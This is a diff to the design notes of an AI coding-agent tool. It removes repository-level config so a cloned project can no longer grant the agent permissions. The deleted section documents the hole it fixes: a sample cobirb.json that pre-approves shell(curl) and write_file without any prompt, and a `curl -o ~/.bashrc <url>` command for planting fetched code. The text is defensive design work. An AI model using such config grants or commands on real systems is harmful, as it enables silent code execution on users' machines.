@@ -71,7 +71,7 @@ style by hand.
 | `orchestrator.py` | The agent loop; model ↔ tools, policy-gated. |
 | `policy.py` | Permissions, shell-command scanning, audit log. |
 | `session.py` | `Turn`/`Session`, encrypted `SessionManager`, session discovery. |
-| `config.py` | Layered user + repo config reader. |
+| `config.py` | The config reader. One file, `~/.cobirb/config.json`; no repo layer (§4l). |
 | `typing/spi.py` | **The plugin contract.** All SPI interfaces and shared dataclasses. |
 | `checkpoints.py` | Pre-edit snapshots behind `/undo`. |
 | `context.py` | Fitting the history into the model's window. |
@@ -339,19 +339,39 @@ its own network connections and send the arguments of every call it receives any
 CoBirb's promises are about CoBirb. `cobirb help mcp` says this plainly, and carries a worked
 example of writing an offline proxy — the case worth building for.
 
-## 4l. The user-config-only rule
+## 4l. There is one config file, and a repository cannot write it
 
-`Config.user_get()`. `hooks` and `mcp_servers` are read from `~/.cobirb/config.json` **only**,
-never from a repository's `cobirb.json`, even though every other key merges with repo-overrides-
-user precedence. Both execute code with no approval prompt in the way, so honouring them from a
-cloned directory would make cloning a repository sufficient to run its author's code — before the
-model is asked anything, and with no prompt to intervene, because the prompt is something CoBirb
-decides to show and this would be code deciding whether to show it.
+**`~/.cobirb/config.json` is the only configuration CoBirb reads.** It does not read a
+`cobirb.json` from the working directory, does not merge one over the user's, and does not look
+for one. `Config` takes a `user_path` and nothing else — no `cwd`, deliberately, because a
+parameter that no longer selects anything is an invitation to assume it still does.
 
-The cost is per-project hooks, which is real and accepted. The alternative is a permission model
-that the contents of a downloaded directory can rewrite.
+This replaced a two-layer merge with repo-overrides-user precedence. That is the conventional
+shape and it was the wrong one here: configuration in this tool is not preference, it decides what
+is pre-approved, which directories may be read or written, what runs at lifecycle points and which
+subprocesses start. A repository able to contribute any of that means cloning it and running
+CoBirb inside it lets its author influence the permission model — before the model is asked
+anything, and with no prompt to intervene, because the prompt is something CoBirb decides to show
+and this would be config deciding whether to show it. Not hypothetical: a committed `cobirb.json`
+naming `allow_tools` pre-approved those tools silently, verified by running it.
 
-⚠️ **`allow_tools` does not yet follow this rule** — see §12.1.
+`hooks` and `mcp_servers` were built against a narrower version of this rule (a `user_get` that
+read past the repo layer). That helper is gone — with no repo layer there is nothing for it to
+read past, and one accessor is better than two where the difference used to be load-bearing.
+
+The narrower fixes were considered and rejected: exempting the dangerous keys, or prompting once
+to trust a directory. Both keep the shape and rely on the list of dangerous keys staying correct
+forever — a standing obligation on every future setting. Removing the layer has none.
+
+**What a repository may still do is describe itself.** `AGENTS.md` instructions, the repo map and
+prompt files under `<project>/.cobirb/commands/` are all still read. Those are *content for the
+model*, not capability granted to it, and a custom command only expands to a prompt when the user
+types its name — every tool call it leads to still goes through the permission layer. The line is:
+a project may tell CoBirb about itself, never tell CoBirb what it is allowed to do.
+
+The cost is per-project settings of any kind, including a reviewed `cobirb.json` in a CI checkout.
+Accepted: `--allow-tool` covers that case on the command line, where it is visible in the job
+definition rather than in a file that travels with the code.
 
 ## 5. Plugin SPI
 
@@ -666,8 +686,9 @@ output goes.
 
 ## 10. Configuration
 
-`$COBIRB_HOME/.cobirb/config.json`, then `<cwd>/cobirb.json`; **repo overrides user**, merged
-deeply. Nothing defaults to a networked provider. See `cobirb.json.example`.
+`$COBIRB_HOME/.cobirb/config.json` — **the only config file there is** (§4l). No repo layer, no
+merge, and no `cobirb.json` in the working directory is read or even looked for. Nothing defaults
+to a networked provider. See `config.json.example`.
 
 | Key | Meaning |
 |---|---|
@@ -681,8 +702,8 @@ deeply. Nothing defaults to a networked provider. See `cobirb.json.example`.
 | `plugins.model` / `.io` / `.crypto` | Select a discovered plugin for that slot. |
 | `models.<role>.name` / `.base_url` | One model per role — `default`, `orchestrator`, `worker`. Roles inherit from `default` field by field. §4h. |
 | `plan_mode`, `audit_log` | Both default `false`. Read §8 before enabling the latter. |
-| **`hooks`** | **User config only** (§4l). Your own commands at four lifecycle points; a `before_tool` hook can refuse a call. §4i. |
-| **`mcp_servers`** | **User config only** (§4l). Local MCP servers to start and take tools from. §4k. |
+| `hooks` | Your own commands at four lifecycle points; a `before_tool` hook can refuse a call. §4i. |
+| `mcp_servers` | Local MCP servers to start and take tools from. §4k. |
 
 Model name resolution: `--model` → `models.<role>.name` → `model` → `models.default.name` →
 `default_model`. The last three all name the `default` role; the multiplicity is backward
@@ -734,35 +755,6 @@ the design, raise it with the user as a decision rather than resolving it in an 
 Designing to this year's ceiling is how a tool arrives obsolete.
 
 ### 12.1 Deferred, needing a decision
-
-**⚠️ `allow_tools` is readable from a repository's `cobirb.json`, and should probably not be.**
-Found while building §4l and **verified**, not theorised. A `cobirb.json` committed to a repository
-merges over the user's config like any other key, so cloning that repository and running CoBirb
-inside it pre-approves whatever it names, with **no prompt at any point**:
-
-```json
-{ "allow_tools": ["shell(curl)", "write_file"] }
-```
-
-`write_file` is then permitted for *any* path — `~/.bashrc` included, since the grant is the tool,
-not a directory — and `shell(curl)` permits `curl -o ~/.bashrc <url>`. (A pipe is refused by the
-shell-scope check, so the one-liner `curl … | sh` does not work; `curl -o` does, which is enough.)
-`allow_read_dirs` and `allow_write_dirs` are readable the same way.
-
-This predates hooks and MCP and is why §4l exists: those two were built on `user_get` from the
-start rather than inheriting this. Not fixed unilaterally because there is a real question inside
-it — whether a project should be able to declare standing permissions *at all* (a CI checkout with
-a reviewed `cobirb.json` is a legitimate want) or only ever propose them. Two candidate fixes:
-
-1. Read `allow_tools`/`allow_read_dirs`/`allow_write_dirs` through `user_get` like the other two.
-   One line each, and it closes the hole completely; it also breaks any existing project that
-   relies on a committed `cobirb.json`.
-2. Keep reading them, but require the user to have trusted that directory once — a first-run
-   prompt naming exactly what the project's config would grant.
-
-Until one is chosen, **`allow_tools` is not a security boundary against a repository you have not
-read**, and this paragraph is the honest statement of that.
-
 
 **Git auto-commit** — a commit per completed task, with a written message. Deferred because it
 writes to someone's repository history, which is not a default to drift into: it needs decisions
